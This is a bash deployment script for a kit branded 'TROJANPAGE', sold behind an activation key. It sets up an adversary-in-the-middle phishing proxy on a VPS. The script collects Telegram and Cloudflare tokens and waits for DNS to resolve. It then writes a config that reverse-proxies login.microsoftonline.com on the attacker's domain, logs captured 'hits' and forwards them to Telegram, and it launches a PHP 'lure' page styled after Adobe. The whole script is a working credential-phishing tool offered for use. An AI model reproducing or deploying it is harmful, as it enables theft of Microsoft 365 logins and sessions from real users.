#!/bin/bash
# 🏛️ TROJANPAGE - AUTO-SYNC & DEPLOY (V7.4)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
    echo -e "${YELLOW}                  [ AUTO-PROPAGATION MODE ACTIVE ]${NC}"
}

# --- 1. TOOLS & IP ---
sudo apt update && sudo apt install -y curl dnsutils sed screen php-cli > /dev/null 2>&1
VPS_IP=$(curl -s https://api.ipify.org)
MASTER_KEY="TROJAN-PRO-2026"

show_header
read -p "ENTER ACTIVATION KEY: " USER_INPUT
[[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[error] Invalid Key.${NC}"; exit 1; }

# --- 2. GATHER SETTINGS FIRST ---
read -p "Enter Telegram Bot Token: " TG_TOKEN
read -p "Enter Telegram Chat ID: " TG_ID
read -p "Enter Cloudflare API Token: " CF_TOKEN
read -p "Enter Domain (motarmo.click): " USER_DOMAIN
USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')

# --- 3. AUTO-REFRESH DNS LOOP ---
echo -e "\n${BLUE}[!] Entering DNS Watch Mode...${NC}"
echo -e "${BLUE}[!] Go to Cloudflare and set A-Record to: ${GREEN}$VPS_IP${NC}"

while true; do
    CURRENT_DNS=$(dig +short A "$USER_DOMAIN" @8.8.8.8 | tail -n1)
    
    if [ "$CURRENT_DNS" == "$VPS_IP" ]; then
        echo -e "\n${GREEN}[SUCCESS] DNS Matched! IP is now $VPS_IP. Deploying now...${NC}"
        break
    else
        echo -ne "${YELLOW}\r[waiting] Current DNS: $CURRENT_DNS | Target: $VPS_IP | Checking again in 20s...   ${NC}"
        sleep 20
    fi
done

# --- 4. FINAL CONFIG GENERATION ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "proxyRules": [
    {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"}
  ]
}
EOF

# --- 5. PERMANENT RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
CONFIG="/root/config.json"
sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy && pkill -9 php
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config "$CONFIG"
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run

# --- 6. AUTO-LAUNCH ---
echo -e "${GREEN}[+] System ready. Launching Engine...${NC}"
sleep 2
Run
